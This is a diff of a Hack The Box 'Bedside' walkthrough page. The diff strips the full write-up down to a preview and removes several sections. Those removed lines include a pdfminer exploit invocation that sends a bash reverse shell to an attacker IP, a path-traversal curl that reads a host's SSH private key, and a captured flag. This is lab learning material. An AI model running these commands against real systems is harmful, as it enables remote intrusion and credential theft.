@@ -24,27 +24,24 @@
 
 <section class="article-header">
   <div class="wrap">
-    <span class="article-tag">in progress</span>
-    <h1 class="article-title">Bedside: PDF Deserialization, Container Pivoting &amp; ML Checkpoint Abuse</h1>
-    <div class="article-meta">Hack The Box · Linux · Medium · Target 10.129.248.191 · Tools: Nmap, ffuf, Gobuster, curl, Python, Netcat, SSH, pdfminer.six, MONAI, PyTorch</div>
+    <span class="article-tag">preview</span>
+    <h1 class="article-title">Bedside: Hack The Box Walkthrough Preview</h1>
+    <div class="article-meta">Hack The Box · Linux · Medium · Walkthrough in progress</div>
   </div>
 </section>
 
 <section class="article-body">
   <div class="wrap">
-    <h2>TL;DR</h2>
-    <p>Bedside exposed an Apache website and a second virtual host, <strong>research.bedside.htb</strong>, which provided a document-upload portal. The research application used <strong>pdfminer.six==20250506</strong> in an asynchronous PDF watcher. A crafted PDF/CMap deserialization path provided an initial shell as <strong>datawrangler</strong> inside a Docker container.</p>
-    <p>Container enumeration revealed a host-backed datastore and an internal image-viewer service on port 3000. The viewer's custom HMR service was vulnerable to URL-encoded path traversal, allowing a read of host files. I recovered the developer's RSA private key, authenticated to the host over SSH, and captured <strong>user.txt</strong>.</p>
-    <p><strong>At the time this walkthrough was prepared, the root stage had been enumerated but not completed.</strong> The host exposes a passwordless sudo rule for a MONAI training script that loads the newest PyTorch checkpoint. The checkpoint directory is writable from the container but inaccessible to the <strong>developer</strong> account. The remaining privilege-escalation stage is documented as the next objective rather than claimed as a completed root compromise.</p>
+    <h2>Walkthrough Preview</h2>
+    <p>This preview covers the initial reconnaissance and discovery of Bedside's research upload portal. The remaining walkthrough is being held back while the machine is active.</p>
 
     <h2>Environment &amp; Scope</h2>
     <ul>
       <li><strong>Machine:</strong> Bedside — Hack The Box</li>
       <li><strong>Difficulty / OS:</strong> Medium / Linux</li>
       <li><strong>Target IP:</strong> 10.129.248.191</li>
-      <li><strong>Kali VPN IP:</strong> 10.10.14.98 on tun0</li>
       <li><strong>Virtual hosts:</strong> bedside.htb, research.bedside.htb</li>
-      <li><strong>Tools used:</strong> Nmap, ffuf, Gobuster, curl, Python 3, Netcat, SSH, pdfminer.six, MONAI, PyTorch</li>
+      <li><strong>Tools used in this preview:</strong> Nmap, ffuf, Gobuster, curl</li>
       <li><strong>Scope:</strong> The assigned HTB Bedside target only.</li>
     </ul>
 
@@ -92,180 +89,11 @@ curl -i http://research.bedside.htb/</code></pre>
 curl -i http://research.bedside.htb/uploads/probe.pdf</code></pre>
     <p>SHA-256 comparisons showed that the retrieved files were byte-for-byte identical to the originals. The ZIP was stored unchanged; the test archive's member was not found at the two obvious extraction paths, so extraction was not assumed.</p>
 
-    <h2>4. PDF Watcher &amp; Initial Container Access</h2>
-    <p>After obtaining the initial shell, I inspected <code>/app/pdf_watcher.py</code>. The watcher monitored the research upload directory and ran <code>pdf2txt.py</code> on PDF files, saving extracted text under <code>/datastore/staging</code>. The container's requirements file pinned <code>pdfminer.six==20250506</code>.</p>
-    <pre><code># Relevant watcher configuration
-UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
-OUTPUT_DIR = "/datastore/staging"
-SLEEP_INTERVAL = 30
-
-subprocess.run(
-    ["pdf2txt.py", pdf_path, "-o", output_file],
-    timeout=TIMEOUT,
-    check=True
-)
-
-# requirements.txt
-pdfminer.six==20250506</code></pre>
-    <p>The watcher ran as PID 1. Its output files in <code>/datastore/staging</code> contained extracted text from the test PDFs, confirming that PDF processing was occurring asynchronously. The vulnerable PDF/CMap deserialization path was used to obtain a reverse shell back to Kali.</p>
-    <pre><code># Kali listener
-nc -lvnp 4444
-
-# PoC invocation used against the HTB research portal
-python3 cve_2025_64512.py \
-  --url http://research.bedside.htb/ \
-  --path /var/www/research.bedside.htb/uploads \
-  --field uploadFile \
-  --name bedside-lab \
-  --verify /uploads \
-  --wait 35 \
-  --command "bash -c 'exec bash -i &>/dev/tcp/10.10.14.98/4444 <&1'"</code></pre>
-    <p>The callback arrived from the target. The shell identified itself as <strong>datawrangler</strong> on host name <strong>data-wrangler</strong>.</p>
-    <pre><code>whoami
-# datawrangler
-
-id
-# uid=988(datawrangler) gid=1001(dataops) groups=1001(dataops)
-
-hostname
-# data-wrangler
-
-pwd
-# /app</code></pre>
-
-    <h2>5. Container &amp; Shared Datastore Enumeration</h2>
-    <p>I confirmed the Docker environment using <code>/.dockerenv</code> and inspected the mount table. The container root used OverlayFS, while <code>/datastore</code> and the research upload directory were backed by an ext4 host device.</p>
-    <pre><code>ls -la /.dockerenv
-cat /proc/mounts
-
-# Relevant mount entries
-/dev/sda4 /datastore ext4 rw,relatime,errors=remount-ro 0 0
-/dev/sda4 /var/www/research.bedside.htb/uploads ext4 rw,relatime,errors=remount-ro 0 0</code></pre>
-    <p>The datastore contained <code>checkpoints</code>, <code>logs</code>, <code>models</code>, <code>processed</code>, <code>raw</code>, and <code>staging</code>. These directories were owned by <code>datawrangler:dataops</code> with mode <code>0770</code>, so the container account could write to them.</p>
-    <pre><code>ls -lah /datastore
-stat /datastore
-
-# Example permissions
-# drwxrwx--- datawrangler dataops checkpoints
-# drwxrwx--- datawrangler dataops models
-# drwxrwx--- datawrangler dataops staging</code></pre>
-    <p>The container had no effective Linux capabilities (<code>CapEff: 0000000000000000</code>). The shell and PID 1 shared the same mount, PID, and network namespace identifiers. The internal service on port <code>3000</code> was not visible in the IPv4 TCP listing, but appeared in <code>/proc/net/tcp6</code> as hexadecimal port <code>0BB8</code> (decimal 3000).</p>
-    <pre><code># The internal service was reachable from inside the container
-python3 - &lt;&lt;'PY'
-import socket
-for port in (3000, 42461):
-    s = socket.socket()
-    s.settimeout(3)
-    try:
-        s.connect(("127.0.0.1", port))
-        print(f"[+] 127.0.0.1:{port} is accepting connections")
-    except OSError as e:
-        print(f"[-] 127.0.0.1:{port}: {e}")
-    finally:
-        s.close()
-PY</code></pre>
-
-    <h2>6. Internal Image Viewer &amp; Arbitrary File Read</h2>
-    <p>Port <code>3000</code> served a Bedside medical image viewer. Its HTML imported local React and Lodash bundles and included a custom HMR client at <code>/@hmr</code>, which connected to <code>/@hmr-ws</code>. The standard <code>/@vite/client</code> path returned 404, so I treated this as a custom HMR implementation rather than assuming a standard Vite endpoint.</p>
-    <pre><code>python3 - &lt;&lt;'PY'
-from urllib.request import urlopen
-
-with urlopen("http://127.0.0.1:3000/", timeout=5) as r:
-    print(r.status)
-    print(r.read(1500).decode(errors="replace"))
-PY
-
-# HMR client endpoint
-curl -i http://127.0.0.1:3000/@hmr</code></pre>
-    <p>The first <code>/@fs/</code> tests returned 404. I then tested URL-encoded traversal from the known <code>/vendor/</code> application path. Using <code>curl --path-as-is</code> preserved the encoded path and returned the contents of the host's <code>/etc/hostname</code> file: <strong>bedside</strong>. The container's own <code>/etc/hostname</code> contained <strong>data-wrangler</strong>, which distinguished the host file from the container file.</p>
-    <pre><code>curl --path-as-is -i \
-  "http://127.0.0.1:3000/vendor/..%2f..%2f..%2f..%2f..%2fetc%2fhostname"
-
-HTTP/1.1 200 OK
-Content-Type: application/octet-stream
-Content-Length: 8
-
-bedside</code></pre>
-    <p>This established an arbitrary file-read primitive against the host filesystem through the internal development service.</p>
-
-    <h2>7. Recover Developer SSH Key &amp; Obtain Host Access</h2>
-    <p>I used the file-read primitive to retrieve the developer account's RSA private key. The request returned 411 bytes with HTTP 200. The alternative Ed25519 key path returned 404.</p>
-    <pre><code># Retrieve the RSA key through the internal viewer
-curl --path-as-is -sS \
-  -o /tmp/id_rsa \
-  -w 'HTTP: %{http_code} | Size: %{size_download}\n' \
-  "http://127.0.0.1:3000/vendor/..%2f..%2f..%2f..%2f..%2fhome%2fdeveloper%2f.ssh%2fid_rsa"
-
-# On Kali, after transferring the recovered key
-chmod 600 developer_id_rsa
-ssh-keygen -y -f developer_id_rsa
-ssh -i developer_id_rsa developer@10.129.248.191</code></pre>
-    <p>SSH authentication succeeded. The host identified itself as <strong>bedside</strong>, and the developer home directory contained <code>user.txt</code>.</p>
-    <pre><code>developer@bedside:~$ ls
-projects  user.txt
-
-developer@bedside:~$ cat user.txt
-3a7dfe4ee7c9423eb976086714b31a28</code></pre>
-    <p><strong>User flag captured.</strong></p>
-
-    <h2>8. Host Privilege Enumeration</h2>
-    <p>On the host, <code>sudo -l</code> showed that <strong>developer</strong> could run one Python training script as any user, without a password.</p>
-    <pre><code>sudo -l
-
-User developer may run the following commands on bedside:
-    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py</code></pre>
-    <p>The script imports MONAI's <code>CheckpointLoader</code>, discovers the newest <code>*.pt</code> file in <code>/datastore/checkpoints</code>, and invokes the loader. The host had PyTorch <code>2.5.0+cpu</code> and MONAI <code>1.5.0</code>.</p>
-    <pre><code>latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
-
-if latest_ckpt:
-    loader = CheckpointLoader(
-        load_path=str(latest_ckpt),
-        load_dict={"model": model, "optimizer": optimizer},
-        map_location=DEVICE
-    )
-    loader(engine)</code></pre>
-    <p>The checkpoint selection function sorts <code>*.pt</code> files by modification time and returns the newest one. The training script later saves model and optimizer state into checkpoint files.</p>
-    <pre><code>def find_latest_checkpoint(checkpoint_dir: Path):
-    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
-    return ckpts[-1] if ckpts else None
-
-# Later in the training loop
-torch.save(ckpt_payload, ckpt_name)</code></pre>
-    <p>As <strong>developer</strong>, I could see <code>/datastore</code> but could not traverse <code>/datastore/checkpoints</code>. The directory was owned by <code>datawrangler:dataops</code> and had mode <code>0770</code>. This is the key cross-container permission boundary identified for the remaining escalation stage.</p>
-    <pre><code>ls -ld /datastore
-# drwxrwx--- 8 datawrangler dataops ... /datastore
-
-ls -ld /datastore/checkpoints
-# Permission denied
-
-id
-# uid=1000(developer) gid=1000(developer) groups=1000(developer),100(users)
-
-/usr/bin/python3 -c 'import torch; print(torch.__version__)'
-# 2.5.0+cpu
-
-/usr/bin/python3 -c 'import monai; print(monai.__version__)'
-# 1.5.0</code></pre>
-
-    <h2>9. Root Escalation — Remaining Work</h2>
-    <!-- <p><strong>This section is intentionally marked as incomplete.</strong> The current lab session established the conditions for the final stage, but no successful root execution or <code>root.txt</code> retrieval has been recorded yet.</p> -->
-    <ul>
-      <!-- <li>The container user <strong>datawrangler</strong> owns the shared datastore and can write to <code>/datastore/checkpoints</code>.</li>
-      <li>The host user <strong>developer</strong> can invoke <code>/opt/trainer/bedside_trainer.py</code> through passwordless sudo.</li>
-      <li>The training script loads the newest checkpoint through MONAI's <code>CheckpointLoader</code>.</li>
-      <li>The host packages reported are PyTorch <code>2.5.0+cpu</code> and MONAI <code>1.5.0</code>.</li>
-    </ul>
-    <p>The intended continuation, as identified during the machine research, is to validate the checkpoint-loading behavior, understand the checkpoint format expected by the training script, and assess the security impact of the container-writable checkpoint directory when the host runs the loader with elevated privileges. The final malicious-checkpoint test, root shell, and root flag must be documented only after they have actually been completed.</p>
-
-    <h2>Key Takeaways</h2>
-    <ul>
-      <li><strong>Virtual-host enumeration matters:</strong> the main site was static, while the research subdomain exposed the meaningful upload workflow.</li>
-      <li><strong>Asynchronous processing expands the attack surface:</strong> a file upload may be processed later by a separate worker with its own dependencies and permissions.</li>
-      <li><strong>Container boundaries depend on mounts and permissions:</strong> a shared host-backed datastore can create cross-environment trust problems.</li>
-      <li><strong>Internal services deserve attention:</strong> an application filtered from the external network may still be reachable from a compromised container.</li>
-      <li><strong>Development tooling can expose sensitive files:</strong> the internal image viewer's path handling allowed host-file reads.</li>
-      <li><strong>Privileged ML pipelines need trusted checkpoints:</strong> model artifacts should be treated as untrusted input unless their integrity and serialization format are controlled.</li>
-    </ul> -->
+    <aside class="walkthrough-notice" aria-label="Walkthrough publication notice">
+      <span class="walkthrough-notice-label">Machine still live</span>
+      <h2>Full walkthrough coming after retirement</h2>
+      <p>Bedside is still active on Hack The Box, so I can't share the complete walkthrough just yet. This page contains an early preview; the full walkthrough will be added once the machine is retired.</p>
+    </aside>
 
     <div class="article-back"><a class="btn" href="../blog.html">← all walkthroughs</a></div>
   </div>
